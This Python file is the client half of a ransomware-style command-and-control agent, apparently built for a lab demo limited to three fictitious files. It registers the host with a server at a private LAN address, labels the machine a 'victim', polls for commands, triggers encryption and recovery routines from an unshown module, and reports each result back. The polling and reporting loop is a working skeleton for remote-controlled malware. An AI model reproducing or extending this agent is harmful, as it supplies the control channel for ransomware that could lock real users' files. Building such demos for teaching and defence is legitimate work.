from __future__ import annotations

import argparse
import time
from pathlib import Path

import requests

from .crypto_demo import encrypt_demo, load_or_create_registration, recover_demo


def post_result(server: str, registration: dict[str, str], state: str, result: str) -> None:
    try:
        requests.post(server + "/resultado", json={"id": registration["id"], "estado": state, "resultado": result}, timeout=5)
    except requests.RequestException:
        pass


def execute(command: str, base: Path, server: str, registration: dict[str, str]) -> str:
    try:
        if command == "CIFRAR_DEMO":
            result = encrypt_demo(base)
            post_result(server, registration, "CIFRADO_DEMO_COMPLETADO", result)
            return result
        if command == "RECUPERAR_DEMO":
            result = recover_demo(base)
            post_result(server, registration, "RECUPERADO", result)
            return result
        return "Comando ignorado"
    except Exception as error:
        post_result(server, registration, "ERROR", str(error))
        return f"ERROR: {error}"


def run(server: str, base: Path, interval: int, once: bool = False) -> None:
    registration = load_or_create_registration(base)
    payload = {"id": registration["id"], "hostname": registration["hostname"]}
    try:
        response = requests.post(server + "/registro", json=payload, timeout=5)
        command = response.json().get("comando")
    except requests.RequestException:
        command = None
    print(f"ID de victima: {registration['id']}")
    while True:
        if command is None:
            try:
                response = requests.post(server + "/poll", json={"id": registration["id"]}, timeout=5)
                command = response.json().get("comando")
            except requests.RequestException:
                command = None
        if command in {"CIFRAR_DEMO", "RECUPERAR_DEMO"}:
            print(execute(command, base, server, registration))
            command = None
        if once:
            return
        time.sleep(interval)


def main() -> None:
    parser = argparse.ArgumentParser(description="Agente V4 limitado a tres archivos ficticios")
    parser.add_argument("--server", default="http://192.168.100.10:5000")
    parser.add_argument("--base", type=Path, default=None)
    parser.add_argument("--interval", type=int, default=3)
    parser.add_argument("--once", action="store_true")
    args = parser.parse_args()
    run(args.server, args.base, args.interval, args.once)


if __name__ == "__main__":
    main()
